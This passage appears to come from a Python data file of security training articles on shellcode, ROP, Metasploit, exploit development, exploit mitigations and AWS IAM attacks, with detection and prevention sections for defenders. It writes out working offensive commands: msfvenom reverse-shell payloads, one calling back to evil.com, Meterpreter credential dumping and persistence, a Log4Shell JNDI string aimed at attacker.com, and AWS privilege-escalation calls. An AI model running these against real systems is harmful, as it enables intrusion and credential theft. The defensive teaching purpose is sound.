# Encode to bypass AV (note: easily detected by modern AV -- use custom encoding)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=4444 -e x64/xor_dynamic -i 5 -f raw -o shellcode.bin
```

## Shellcode Delivery Methods

```c
// 1. Stack-based (via buffer overflow)
char buf[64];
memcpy(buf, shellcode, shellcode_len);
// Overflow redirects EIP to buf

// 2. Heap spray (fill heap for reliable exploitation)
for (int i = 0; i < 0x200; i++) {
    char *chunk = malloc(0x1000);
    memcpy(chunk, nop_sled + shellcode, 0x1000);
}
// Hope that control flow lands in a NOP sled

// 3. Process injection (CreateRemoteThread / APC)
// As described in process injection article

// 4. .NET in-memory execution
// [System.Reflection.Assembly]::Load(shellcode_bytes)
```

## Encoding and Bad Character Removal

```python
# XOR encode shellcode to remove null bytes and bad chars
key = 0xAB
shellcode = b"\\x48\\x31\\xc0..."  # original shellcode

encoded = bytes([b ^ key for b in shellcode])

# Decoder stub (must be prepended to encoded shellcode):
# mov ecx, len
# mov esi, encoded_shellcode_address
# loop: xor byte [esi], 0xAB; inc esi; loop

# Verify no bad chars in encoded result:
bad_chars = [0x00, 0x0a, 0x0d]
for b in encoded:
    if b in bad_chars:
        print(f"Bad char found: 0x{b:02x}")
```

## Detection Opportunities

```kql
// RWX memory allocation in non-malware-expected process
// EDR: alert on VirtualAlloc/VirtualAllocEx with PAGE_EXECUTE_READWRITE
// followed by WriteProcessMemory to that region

// Shellcode YARA patterns in memory:
// - NOP sleds: sequences of 0x90
// - Common shellcode signatures: PEB walk pattern, GetProcAddress pattern
// - msfvenom shellcode has known byte sequences at beginning

// Network: reverse shell callback immediately after process injection
// svchost.exe (or other injected process) making outbound TCP to non-internal IP

// Crash telemetry: application crash (SIGSEGV/access violation) + new network connection
// from parent process = exploitation in progress
```

## Prevention

1. **DEP/NX + ASLR**: Shellcode on stack/heap cannot execute; addresses randomised
2. **CFI (Control Flow Integrity)**: Prevents shellcode from redirecting execution to unexpected locations
3. **Memory scanning**: EDR scans allocated memory for shellcode signatures
4. **Sandboxing**: Run untrusted code in isolated sandbox (browser renderer, document viewer)
5. **Crash reporting**: Centralise application crash telemetry -- exploitation often causes crashes
""",
    },
    {
        "title": "Return-Oriented Programming (ROP) and Modern Exploit Mitigations",
        "tags": ["ROP", "return-oriented-programming", "DEP-bypass", "ASLR", "T1203", "exploit-mitigations"],
        "content": r"""# Return-Oriented Programming (ROP) and Modern Exploit Mitigations

## Overview

Modern systems deploy DEP (Data Execution Prevention) to mark memory non-executable, preventing classic shellcode injection. Return-Oriented Programming (ROP) bypasses DEP by chaining small existing code sequences ("gadgets") to build arbitrary computation without injecting new code.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1203 | Exploitation for Client Execution | Execution |
| T1068 | Exploitation for Privilege Escalation | Privilege Escalation |

## Why Classic Shellcode Fails with DEP

```
Without DEP:
  Overflow -> overwrite return address -> point to shellcode on stack -> execute

With DEP:
  Overflow -> overwrite return address -> point to shellcode on stack -> EXCEPTION
  (Stack marked NX/non-executable)
```

## ROP Chain Basics

ROP uses existing code ("gadgets") already in executable memory. Each gadget ends with a `RET` instruction. By controlling the stack, an attacker chains gadgets to perform arbitrary operations.

```
Gadget: a small sequence of instructions ending with RET
Example gadgets in libc:
  0x40019a: pop rdi; ret        (load value into rdi)
  0x40026b: pop rsi; ret        (load value into rsi)
  0x4003c4: pop rdx; ret        (load value into rdx)
  0x4009f5: syscall; ret        (execute syscall)

ROP chain for execve("/bin/sh") on x64 Linux:
Stack layout:
  [address of "pop rdi; ret"]   <- first gadget
  [address of "/bin/sh" string] <- value for rdi (arg1)
  [address of "pop rsi; ret"]
  [0x0]                         <- rsi = NULL (arg2)
  [address of "pop rdx; ret"]
  [0x0]                         <- rdx = NULL (arg3)
  [address of "pop rax; ret"]
  [59]                          <- rax = execve syscall number
  [address of "syscall; ret"]   <- execute!
```

## ROP Tools

```bash
# ROPgadget -- find gadgets in binary
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --rop --ropchain
ROPgadget --binary vuln | grep "pop rdi ; ret"

# pwntools -- automated ROP chain construction (Python)
from pwn import *
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])  # leak libc address (ASLR bypass)
rop.call(elf.sym['main'])           # return to main for second stage

# ropper -- alternative gadget finder
ropper -f libc.so.6 --search "pop rdi; ret"
```

## ASLR Bypass

```python
# ASLR randomises base addresses each run
# Bypass: leak a pointer to calculate ASLR slide

# 1. Format string leak (if format string vuln exists):
printf("%6$p")  # leak stack pointer -> calculate offset to libc

# 2. ROP leak (call puts(got[puts]) to reveal libc address):
# puts() prints the address at got[puts] -- that's puts()'s actual runtime address
# libc_base = leaked_puts_addr - libc.sym['puts']
# system_addr = libc_base + libc.sym['system']
# bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

# 3. Partial overwrites (32-bit or if only LSBs unknown):
# Only overwrite last 1-2 bytes of return address
# 16 possible values if 1 byte unknown (ASLR doesn't randomise page offset)
```

## Modern Mitigations

| Mitigation | What it prevents | Bypass technique |
|---|---|---|
| DEP/NX | Shellcode on stack/heap | ROP |
| ASLR | Hardcoded addresses | Info leak, partial overwrite |
| Stack canary | Stack overflow | Leak canary, overwrite other data |
| PIE | Hardcoded binary addresses | Info leak of binary |
| CFI | Arbitrary return/jump targets | ROP with CFI-valid gadgets |
| CET/Shadow Stack | Return address overwrite | Requires kernel/hardware bypass |
| RELRO | GOT overwrite | Hard - GOT marked read-only |
| SafeStack | Return address overwrite | Separate safe stack in TLS |

## Detection Opportunities

```kql
// Unusual ROP chain execution: many short code sequences followed by RET
// Very hard to detect at OS level without hardware support (Intel PT)

// Crash telemetry: stack canary violation
syslog.message: "stack smashing detected" OR
winlog.event_data.ExceptionCode: "0xc0000409"  // STATUS_STACK_BUFFER_OVERRUN

// Process making unexpected syscalls after unusual stack activity
// Intel PT + EDR can trace execution flow and detect ROP

// Application crash with access violation at unexpected address
// (ASLR failure = crash; success = no crash -> distinguish exploit from crash)
```

## Prevention

1. **Enable all mitigations**: DEP + ASLR + PIE + Stack canaries + Full RELRO + CFI
2. **CET (Control-flow Enforcement Technology)**: Hardware shadow stack -- cannot be bypassed with software ROP
3. **Safe heap allocators**: mimalloc, jemalloc with improved metadata protection
4. **Fuzzing**: Discover exploitable crashes before attackers do
5. **Patch management**: Most ROP exploits target known CVEs -- patch within SLA
""",
    },
    {
        "title": "Metasploit Framework — Modules, Payloads, and Post-Exploitation",
        "tags": ["metasploit", "meterpreter", "post-exploitation", "T1203", "T1059", "framework"],
        "content": r"""# Metasploit Framework — Modules, Payloads, and Post-Exploitation

## Overview

The Metasploit Framework is the most widely used exploitation framework, used by both legitimate penetration testers and malicious actors. Understanding Metasploit's capabilities helps SOC analysts recognise Meterpreter shells, staged payloads, and post-exploitation activity.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1203 | Exploitation for Client Execution | Execution |
| T1059 | Command and Scripting Interpreter | Execution |
| T1071 | Application Layer Protocol | Command and Control |

## Framework Structure

```
Metasploit modules:
  exploit/     -- exploits (vulnerability + payload delivery)
  auxiliary/   -- scanning, fuzzing, enumeration (no payload)
  post/        -- post-exploitation (run after shell obtained)
  payload/     -- shellcode and staged payloads
  encoder/     -- payload encoding/obfuscation
  evasion/     -- AV/EDR evasion modules
  nop/         -- NOP sled generators
```

## Basic Usage

```bash
# Start msfconsole
msfconsole

# Search for exploit
msf> search type:exploit platform:windows name:eternalblue

# Use module
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> info            # full module information
msf> show options    # required and optional settings
msf> set RHOSTS 10.10.10.40
msf> set LHOST 10.10.10.1
msf> set LPORT 4444
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run
msf> exploit         # or 'run'
# -> Meterpreter session opened
```

## Payload Types

```
Staged payloads (windows/x64/meterpreter/reverse_tcp):
  Stage 0 (stager): tiny shellcode that connects back and downloads stage 1
  Stage 1 (stage): full Meterpreter DLL, loaded into memory

Stageless payloads (windows/x64/meterpreter_reverse_tcp):
  Single self-contained payload -- larger but no second connection needed
  Better for environments with network filtering

Singles (windows/exec):
  Completely self-contained, single-purpose
  e.g., windows/exec CMD=calc.exe
```

## Meterpreter Post-Exploitation

```bash
# Basic Meterpreter commands
meterpreter> sysinfo           # OS, hostname, arch
meterpreter> getuid            # current user
meterpreter> getpid            # current process ID
meterpreter> ps                # process list
meterpreter> migrate 688       # migrate into another process (PID 688)

# Privilege escalation
meterpreter> getsystem         # attempt automated privesc
meterpreter> hashdump          # dump local SAM hashes (requires SYSTEM)

# Credential access
meterpreter> load kiwi         # load Mimikatz module
meterpreter> creds_all         # dump all credentials

# Lateral movement
meterpreter> run post/windows/manage/enable_rdp  # enable RDP
meterpreter> portfwd add -l 3389 -p 3389 -r 10.10.10.5  # port forward

# File operations
meterpreter> upload evil.exe C:\\Windows\\Temp\\
meterpreter> download C:\\Users\\admin\\Documents\\sensitive.docx

# Pivoting
meterpreter> run post/multi/manage/autoroute  # add routes through session
msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 1080
msf> run &
# proxychains tools now route through compromised host
```

## Persistence via Metasploit

```bash
# Persistence module
meterpreter> run post/windows/manage/persistence_exe STARTUP=SCHEDULER SCHEDULE_TYPE=DAILY EXE_NAME=WindowsUpdate.exe

# Add admin user
meterpreter> run post/windows/manage/enable_rdp USERNAME=hacker PASSWORD=P@ss123
```

## Detection Opportunities

```kql
// Meterpreter reverse TCP: outbound connection to unusual IP on non-standard port
// Staged payload: second outbound connection immediately after first (stage download)
network.direction: "outbound" AND
NOT destination.port: (80 OR 443 OR 53) AND
process.name: ("svchost.exe" OR "explorer.exe" OR "cmd.exe")

// Meterpreter in-memory signatures (YARA / EDR memory scan)
// Known strings: "ReflectiveDll", "Meterpreter", specific export table hashes

// Post-exploitation commands (process migration, hashdump)
// Sysmon Event 10: process access with memory read permissions
// EDR: kiwi/Mimikatz module load detection

// EternalBlue exploitation: SMB traffic with shellcode payload structure
network.protocol: "smb" AND
network.bytes: > 65000 AND  // large SMB packet (shellcode delivery)
destination.port: 445
```

## Prevention

1. **Patch EternalBlue/other exploited CVEs**: MS17-010 should be patched on all systems
2. **Network segmentation**: Prevent SMB lateral movement with host firewall rules
3. **EDR with Meterpreter signatures**: All major EDRs detect standard Meterpreter
4. **Restrict outbound connections**: Workstations should not initiate raw TCP to internet
5. **Monitor for staged payload callbacks**: Two rapid outbound connections from same process
6. **PowerShell logging**: Meterpreter often delivers second stage via PowerShell
""",
    },
    {
        "title": "Vulnerability Research — Fuzzing, Reverse Engineering, CVE Analysis",
        "tags": ["vulnerability-research", "fuzzing", "reverse-engineering", "CVE", "T1588.005", "bug-hunting"],
        "content": r"""# Vulnerability Research — Fuzzing, Reverse Engineering, CVE Analysis

## Overview

Vulnerability research discovers security flaws in software before (or after) attackers. For SOC analysts, understanding how CVEs are discovered and analysed enables faster triage, realistic impact assessment, and identification of exploitation attempts in logs.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1588.005 | Obtain Capabilities: Exploits | Resource Development |
| T1587.004 | Develop Capabilities: Exploits | Resource Development |

## Fuzzing

Fuzzing sends semi-random input to a program to discover crashes (memory corruption).

```bash
# AFL++ -- coverage-guided fuzzer
# Compile target with AFL instrumentation
CC=afl-gcc ./configure && make
afl-fuzz -i input_seeds/ -o findings/ -- ./target @@
# @@ = input file placeholder (AFL writes mutated input to file)

# LibFuzzer (in-process fuzzing)
# Compile with: clang -fsanitize=address,fuzzer target.c -o fuzz_target
./fuzz_target corpus/

# Sanitisers (detect bugs that don't crash immediately)
clang -fsanitize=address target.c  # AddressSanitizer: detects heap/stack overflows
clang -fsanitize=undefined target.c  # UBSan: detects integer overflow, out-of-bounds

# Boofuzz -- network protocol fuzzer (Python)
from boofuzz import *
session = Session(target=Target(connection=TCPSocketConnection("10.10.10.1", 21)))
# Define protocol structure
s_initialize("ftp")
s_string("USER ", fuzzable=False)
s_string("admin", fuzzable=True)
s_static("\\r\\n")
session.connect(s_get("ftp"))
session.fuzz()

# Radamsa -- mutation fuzzer
# Generate mutations of a seed file
radamsa seed.jpg > mutated1.jpg
for i in $(seq 100); do radamsa seed.pdf; done | your_pdf_reader
```

## Reverse Engineering

```bash
# Static analysis tools
# Ghidra (NSA, free) -- full decompiler and disassembler
# IDA Pro (Hex-Rays, paid) -- industry standard
# Binary Ninja (paid, popular with researchers)
# Radare2 (free, CLI)

# Basic radare2 workflow
r2 -A ./target           # analyse all
> afl                    # list all functions
> s sym.vulnerable_func  # seek to function
> pdf                    # print disassembly with function

# strings -- find interesting strings
strings -a target | grep -E "(password|key|secret|sql|http)"

# ltrace/strace -- dynamic tracing
strace ./target input    # trace syscalls
ltrace ./target input    # trace library calls

# Binary diffing (patch comparison)
# Compare patched vs unpatched binary to find fixed vulnerability
# Tools: bindiff (Zynamics), diaphora (free Ghidra/IDA plugin)
```

## CVE Analysis Workflow

```bash
# 1. Find CVE details
curl "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
# Severity (CVSS), affected versions, CWE type

# 2. Find public PoC
searchsploit log4j 2.x
# GitHub: site:github.com CVE-2021-44228 poc
# PacketStorm, Exploit-DB

# 3. Reproduce in lab (NEVER test on production)
docker run -p 8080:8080 vulnerable/log4shell-demo
# Confirm vulnerability exists before weaponising

# 4. Determine exploitation requirements
# - Authentication required?
# - Network path needed?
# - User interaction needed?

# 5. Impact assessment for your environment
# Which assets run the affected software version?
# What data/credentials could be exposed?
```

## Detection Opportunities

```kql
// Exploitation attempts against known CVE patterns (WAF/IDS signatures)
// Log4Shell example:
http.request.body: ("jndi:" AND ("ldap://" OR "rmi://" OR "dns://"))

// Crash-based exploitation detection
// Application crash (access violation) followed by outbound network connection
// (successful exploit) or repeated crashes (failed exploitation attempts)

// Fuzzing detection: many requests with binary/non-printable data, rapid sequence
http.request.body_bytes: > 0 AND
NOT http.request.mime_type: ("application/json" OR "application/x-www-form-urlencoded") AND
http.request.count_per_minute: > 100
```

## Prevention

1. **Patch management**: Subscribe to vendor security advisories; patch critical CVEs within 72 hours
2. **Vulnerability scanning**: Weekly authenticated scans of all assets (Nessus, Qualys, Rapid7)
3. **Virtual patching**: WAF rules while awaiting patch deployment
4. **Software composition analysis**: Track open-source components (Log4j, Spring, etc.) with known CVEs
5. **Bug bounty programs**: Incentivise external researchers to report before exploiting
""",
    },
    {
        "title": "Windows Exploit Mitigations — DEP, ASLR, CFG, CET",
        "tags": ["DEP", "ASLR", "CFG", "CET", "exploit-mitigations", "windows-security", "T1203"],
        "content": r"""# Windows Exploit Mitigations — DEP, ASLR, CFG, CET

## Overview

Windows has built multiple hardware and software exploit mitigations into the OS over successive versions. SOC analysts who understand what each mitigation does can better assess the severity of exploitation attempts and prioritise patching.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1203 | Exploitation for Client Execution | Execution |
| T1068 | Exploitation for Privilege Escalation | Privilege Escalation |

## DEP (Data Execution Prevention) / NX

Marks memory pages as either writable (data) or executable (code) but not both.

```
Without DEP: attacker injects shellcode on stack/heap -> executes
With DEP: stack/heap marked non-executable -> shellcode injection causes exception

Windows config:
# OptIn: enabled for Windows components only (default)
# OptOut: enabled for all except explicitly excluded
# AlwaysOn: always for all processes
# AlwaysOff: never

bcdedit /set nx AlwaysOn  # Force DEP for all processes

# Check DEP status:
Get-ProcessMitigation -System | Select-Object DEP
```

**Bypass:** Return-Oriented Programming (ROP) -- doesn't inject new code, reuses existing.

## ASLR (Address Space Layout Randomisation)

Randomises base addresses of stack, heap, and loaded modules on each boot/process start.

```powershell
# Enable ASLR system-wide
Set-ProcessMitigation -System -Enable ASLR, BottomUpASLR, HighEntropyASLR, ForceASLR

# Verify:
Get-ProcessMitigation -System | Select-Object ASLR

# Process-level enforcement:
Set-ProcessMitigation -Name chrome.exe -Enable ASLR, HighEntropyASLR
```

**Bypass:** Information leaks (format string, heap info leak) reveal module base addresses, allowing ROP gadget calculation.

## CFG (Control Flow Guard)

Validates indirect call targets against a bitmap of valid call sites at compile time. Invalid jumps (e.g., to shellcode or ROP gadgets) cause process termination.

```
How it works:
  Compiler inserts check before every indirect call/jump:
    if (target not in valid_targets_bitmap): terminate()

Limitation: only checks INDIRECT calls; direct calls unchecked
Bypass: use valid CFG targets (existing function entries) as ROP gadgets
```

```powershell
# Enable CFG
Set-ProcessMitigation -System -Enable CFG

# Build with CFG (MSVC):
# /guard:cf compiler flag
# Check if binary has CFG: dumpbin /headers binary.exe | grep "Guard"
```

## CET (Control-flow Enforcement Technology) / Shadow Stack

Intel CET (Skylake+) maintains a shadow copy of the return address stack in protected memory.

```
How it works:
  CPU maintains shadow stack (separate from regular stack)
  CALL instruction pushes return address to BOTH regular and shadow stack
  RET instruction: compare top of shadow stack with return address
    if mismatch: #CP exception -> process terminated

Bypass requirements:
  Must compromise both regular AND shadow stack simultaneously
  Shadow stack in protected region (cannot be written via WriteProcessMemory)
  Hardware-enforced -- no software bypass possible without kernel exploit
```

```powershell
# Enable CET (Windows 11, hardware required)
Set-ProcessMitigation -System -Enable CET

# Check hardware support:
(Get-WmiObject -Class Win32_Processor).Capabilities  # bit 10 = CET supported
```

## ACG (Arbitrary Code Guard)

Prevents dynamic code generation and modification in a process -- blocks JIT spraying and shellcode injection that modifies existing executable pages.

```powershell
Set-ProcessMitigation -Name browser.exe -Enable ACG
# Incompatible with JIT compilers -- only for processes that don't do JIT
```

## SEHOP (Structured Exception Handler Overwrite Protection)

```powershell
# Validates SEH chain integrity before dispatching exception
# Blocks classic SEH overwrite exploits
Set-ProcessMitigation -System -Enable SEHOP
```

## Detection of Exploitation Attempts Against Mitigations

```kql
// DEP violation (access violation on execution)
winlog.event_id: 1000 AND
winlog.event_data.ExceptionCode: "0xc0000005" AND
// Instruction pointer in data segment (stack address range)

// CFG violation (invalid call target)
winlog.event_id: 1000 AND
winlog.event_data.ExceptionCode: "0xc0000409"  // STATUS_STACK_BUFFER_OVERRUN (also CFG)

// CET shadow stack violation
// Event logged to Windows Security Event Log when CET fires
// Application terminates with specific exception code
```

## Prevention / Hardening

```powershell
# Apply comprehensive mitigations via PowerShell
$ProcessMitigationOptions = @{
    ASLR = @{Enable = 'ASLR', 'BottomUpASLR', 'HighEntropyASLR', 'ForceASLR'}
    DEP = @{Enable = 'Enable', 'EmulateAtlThunks'}
    CFG = @{Enable = 'CFG', 'SuppressExports'}
    CET = @{Enable = 'CET'}
    SEHOP = @{Enable = 'SEHOP'}
}

Set-ProcessMitigation -System -Enable ASLR, DEP, CFG, SEHOP

# Exploit protection (Windows Defender Exploit Guard)
# Configure via: Windows Security -> App & browser control -> Exploit protection
# Or import XML config across fleet via Intune/SCCM
```
""",
    },
    {
        "title": "Linux Exploit Mitigations — NX, PIE, Stack Canaries, RELRO",
        "tags": ["NX", "PIE", "stack-canaries", "RELRO", "linux-hardening", "exploit-mitigations"],
        "content": r"""# Linux Exploit Mitigations — NX, PIE, Stack Canaries, RELRO

## Overview

Linux provides compile-time and runtime mitigations that significantly raise the cost of exploitation. Understanding which mitigations are present in a binary -- and what bypasses exist -- is fundamental exploit development and patch prioritisation knowledge.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1203 | Exploitation for Client Execution | Execution |
| T1068 | Exploitation for Privilege Escalation | Privilege Escalation |

## Checking Mitigations

```bash
# checksec -- comprehensive mitigation audit tool
checksec --file=./target

# Example output:
# RELRO:    Full RELRO
# STACK CANARY: Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RPATH:    No RPATH
# RUNPATH:  No RUNPATH

# readelf -- manual check
readelf -l ./target | grep GNU_STACK  # RWE = no NX; RW = NX enabled
readelf -d ./target | grep BIND_NOW   # Full RELRO indicator
```

## NX / DEP (Non-eXecutable Stack)

```bash
# Enable NX at compile time (default on modern compilers)
gcc -o target target.c  # NX enabled by default

# Disable NX (insecure -- only for learning)
gcc -z execstack -o target target.c

# Kernel-side: hardware NX bit in page tables (CPU feature required)
# Check: /proc/cpuinfo | grep nx

# Bypass: Return-to-libc / ROP
# Instead of shellcode, redirect to system() in libc:
# Return address -> system@plt, arg = "/bin/sh"
```

## Stack Canaries

```bash
# Enable (default with -fstack-protector-strong)
gcc -fstack-protector-strong -o target target.c

# Canary mechanism:
# gcc places a random value (canary) between local vars and saved EBP
# Before function returns: canary checked against known value
# Mismatch = __stack_chk_fail() called -> program aborted

# Bypass techniques:
# 1. Leak canary via format string or out-of-bounds read
# 2. Overwrite canary with correct value (if known)
# 3. Target data OTHER than return address (bypass canary entirely)
#    e.g., overwrite function pointer before canary check

# Brute force (only on forking servers -- child inherits canary)
# 32-bit: canary = 3 random bytes + null = 256^3 = 16M possibilities
# Fork server: parent canary unchanged between connections -> brute force byte-by-byte
for b in range(256):
    try_canary_byte(b)  # 256 attempts per byte, 3 bytes = 768 total attempts
```

## PIE (Position Independent Executable)

```bash
# Compile with PIE (default on modern distros)
gcc -pie -fPIC -o target target.c

# Without PIE: binary loaded at fixed address -> gadget addresses known
# With PIE: binary loaded at random base address each run

# Check:
file target  # "ELF 64-bit LSB pie executable" vs "ELF 64-bit LSB executable"
readelf -h target | grep "Type"  # ET_DYN = PIE, ET_EXEC = no PIE

# Bypass: information leak
# If any pointer from the binary's address space is leaked:
# leaked_addr - known_offset = binary_base
# Then calculate all gadget addresses

# 32-bit PIE: only 16-bit entropy -> brute forceable on forking servers
```

## RELRO (Relocation Read-Only)

```bash
# Full RELRO: GOT (Global Offset Table) marked read-only after startup
# Partial RELRO: only some sections protected
# No RELRO: GOT writable -> GOT overwrite exploit possible

# Compile with Full RELRO:
gcc -Wl,-z,relro,-z,now -o target target.c

# Check:
readelf -d target | grep BIND_NOW   # Full RELRO
readelf -d target | grep RELRO      # Partial RELRO

# GOT overwrite (requires no/partial RELRO):
# Write target address over GOT entry for commonly-called function
# Next call to that function redirects to attacker code
# e.g., overwrite free@got.plt with system_addr
# Then: free("/bin/sh") -> system("/bin/sh")
```

## FORTIFY_SOURCE

```bash
# Replace unsafe functions with bounds-checked versions
gcc -D_FORTIFY_SOURCE=2 -O1 -o target target.c
# Replaces: strcpy -> __strcpy_chk, printf -> __printf_chk, etc.
# Runtime check: if destination buffer overflow detected -> abort
```

## Full Hardening Compilation

```bash
# Recommended flags for security-critical software:
gcc -Wall -Wextra \
    -fstack-protector-strong \
    -D_FORTIFY_SOURCE=2 \
    -pie -fPIC \
    -Wl,-z,relro,-z,now \
    -O2 \
    -o target target.c
```

## Detection Opportunities

```kql
// Stack canary violation
// dmesg / syslog entry
syslog.message: "stack smashing detected" OR
syslog.message: "__stack_chk_fail"

// Application crash on exploitation attempt
// SIGSEGV (signal 11) generated by process -- especially repeating crashes
// (fuzzing or exploit retry pattern)
process.exit_code: 139 OR  // 128 + SIGSEGV
process.exit_code: 134     // 128 + SIGABRT (canary check failure)

// Core dump generation (enabled kernels)
// core files in /var/crash or /tmp after exploitation attempt
```

## Prevention

1. **Enable all mitigations at build time**: Use hardening flags in build systems
2. **RELRO full for all services**: Prevents GOT overwrite persistence technique
3. **PIE for all user-facing services**: Essential to make ASLR effective
4. **Regular checksec audits**: Verify all deployed binaries have expected mitigations
5. **Compiler updates**: Newer compiler versions add and improve mitigations automatically
6. **Kernel hardening**: `kernel.randomize_va_space=2` (ASLR); `kernel.dmesg_restrict=1`
""",
    },
    {
        "title": "Exploit Development Workflow — From PoC to Weaponisation",
        "tags": ["exploit-dev", "PoC", "weaponisation", "CVE", "T1587.004", "vulnerability-exploitation"],
        "content": r"""# Exploit Development Workflow — From PoC to Weaponisation

## Overview

Understanding how attackers take a CVE from public disclosure to weaponised exploit helps defenders prioritise patching and understand the timeline of risk. This article documents the exploit development lifecycle as a defender-oriented reference.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1587.004 | Develop Capabilities: Exploits | Resource Development |
| T1588.005 | Obtain Capabilities: Exploits | Resource Development |

## Phase 1 — Vulnerability Identification

```
Information sources:
- NVD (nvd.nist.gov): CVE details, CVSS scores, CWE types
- Vendor advisories: Microsoft MSRC, Red Hat Security, Ubuntu USN
- Exploit databases: Exploit-DB, PacketStorm, GitHub (CVE PoC repos)
- Threat intelligence: Recorded Future, Mandiant, Crowdstrike blogs
- Twitter/Mastodon: security researchers often tweet PoC within hours of disclosure
```

## Phase 2 — PoC Analysis

```bash
# Typical PoC evaluation:
# 1. Read the advisory -- understand the bug class (use-after-free, buffer overflow, etc.)
# 2. Identify affected versions
# 3. Download and read the PoC code
# 4. Identify prerequisites: auth, network access, specific configuration

# Example: Log4Shell PoC (CVE-2021-44228) analysis
# Bug: JNDI lookup in log4j message processing
# Prerequisites: none (unauthenticated) -- just log any user-controlled string
# Trigger: ${jndi:ldap://attacker.com/payload}
# Payload: Java class loaded from LDAP server -> RCE

# Test in isolated lab:
docker run -p 8080:8080 vulnerable-app:log4j2-affected
curl -H "User-Agent: ${jndi:ldap://127.0.0.1:1389/exploit}" http://localhost:8080/
```

## Phase 3 — Reliability Engineering

Raw PoCs are often unreliable. Weaponisation improves reliability:

```python
# Reliability improvements:
# 1. Handle network timeouts and retries
# 2. Support multiple payload types
# 3. Handle different OS versions / configurations
# 4. Verify success before exiting
# 5. Clean up artefacts (remove webshells, clear logs)

# Example structure of a reliable exploit:
class Exploit:
    def __init__(self, target, lhost, lport):
        self.target = target
        self.lhost = lhost
        self.lport = lport

    def check(self):
        # Verify target is vulnerable before exploiting
        r = requests.get(f"http://{self.target}/version")
        return "2.14.0" in r.text  # check vulnerable version

    def exploit(self):
        # Deliver payload
        payload = self.generate_payload()
        self.deliver(payload)
        return self.verify_shell()

    def verify_shell(self):
        # Confirm shell is working
        # wait for callback; timeout after 30s
        pass
```

## Phase 4 — Payload Integration

```bash
# Generate payloads for target environment
# Windows target with likely AV:
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=evil.com LPORT=443 -e x64/xor_dynamic -i 10 -f raw -o stage1.bin

# Encode to bypass AV
python encode_payload.py --input stage1.bin --key 0xAB --output encoded.bin

# Embed in exploit
# Replace hardcoded shellcode bytes in PoC with custom payload
```

## Phase 5 — C2 Infrastructure Setup

```bash
# Before exploitation: prepare to receive callbacks
# Metasploit listener:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false
exploit -j

# Cobalt Strike: already running team server
# Ensure DNS C2 domain configured if using DNS beacon
```

## Detection Opportunities — Exploit Development Indicators

```kql
// Rapid exploitation after CVE disclosure (attackers exploit within hours)
// Correlate vulnerability disclosure dates with first exploitation attempts in logs

// PoC scanning patterns: generic CVE-test payloads in WAF/IDS logs
http.request.uri: ("jndi:" OR "CVE-" OR "exploit" OR "PoC") AND
// Source: scanner ASNs (Shodan, Censys, known vuln scanner IPs)

// Exploitation telemetry: specific CVE payload patterns
// Log4Shell: jndi: in any HTTP header or parameter
http.request.headers: "${jndi:"
// ProxyShell: specific URL patterns
http.request.uri: ("/autodiscover/autodiscover.json?" AND "Email=autodiscover")
```

## Defender Timeline Response

```
Day 0: CVE disclosed / vendor advisory published
  -> IMMEDIATE: Assess if affected software in environment
  -> If yes: identify all instances (CMDB, Qualys/Tenable scan)

Day 0-1: PoC published (often within hours of critical CVEs)
  -> Deploy WAF virtual patch / IDS signature immediately
  -> Monitor for exploitation attempts in logs

Day 1-3: Weaponised exploits appear (Metasploit module, ransomware integration)
  -> Emergency patching for critical/high CVSS (< 72 hours for internet-facing)
  -> Network isolation of unpatched critical assets

Day 7-30: Widespread exploitation by ransomware/criminal groups
  -> All instances should be patched by now
  -> Continue monitoring for late-arriving attackers
```
""",
    },
]


# ============================================================
# COLLECTION 7: CLOUD & CONTAINER ATTACKS
# ============================================================

CLOUD_ATTACKS = [
    {
        "title": "AWS Attack Paths — IAM Misconfiguration, S3 Bucket Enum, Lambda Abuse",
        "tags": ["AWS", "IAM", "S3", "Lambda", "cloud-attacks", "T1552.005", "T1530"],
        "content": r"""# AWS Attack Paths — IAM Misconfiguration, S3 Bucket Enum, Lambda Abuse

## Overview

AWS attack paths most commonly exploit IAM misconfiguration, overly permissive policies, and metadata service access. Understanding these paths helps cloud security teams build detection and prevention controls.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1552.005 | Unsecured Credentials: Cloud Instance Metadata API | Credential Access |
| T1530 | Data from Cloud Storage Object | Collection |
| T1578 | Modify Cloud Compute Infrastructure | Defense Evasion |

## IAM Enumeration

```bash
# Enumerate IAM rights with current credentials
aws sts get-caller-identity  # Who am I?
aws iam get-user
aws iam list-attached-user-policies --user-name attacker
aws iam list-user-policies --user-name attacker
aws iam list-groups-for-user --user-name attacker

# Enumerate all IAM users, roles, policies
aws iam list-users
aws iam list-roles
aws iam list-policies --scope Local  # customer-managed policies

# Pacu -- AWS attack framework (Rhino Security Labs)
Pacu> import_keys --username attacker_access_key attacker_secret_key
Pacu> run iam__enum_permissions
Pacu> run iam__privesc_scan  # scan for privilege escalation paths
```

## IAM Privilege Escalation

```bash
# Classic paths to escalate in AWS:

# 1. iam:AttachUserPolicy -> attach AdministratorAccess to self
aws iam attach-user-policy --user-name attacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 2. iam:CreatePolicyVersion -> create new policy version with admin rights
aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/TargetPolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
